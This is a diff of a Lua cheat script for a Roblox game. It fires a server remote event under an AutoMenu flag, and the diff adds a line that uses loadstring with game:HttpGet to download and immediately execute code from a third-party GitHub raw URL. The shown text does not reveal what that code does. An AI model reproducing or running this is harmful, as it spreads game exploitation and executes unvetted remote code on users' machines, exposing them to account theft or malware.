@@ -43,5 +43,10 @@ if getgenv().AutoMenu then
             }
         }
         
-        game:GetService("ReplicatedStorage").dataRemoteEvent:FireServer(unpack(args))     
+        game:GetService("ReplicatedStorage").dataRemoteEvent:FireServer(unpack(args))   
+wait(0.9)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/Best/main/Dungeon"))()
 end
+
+
+
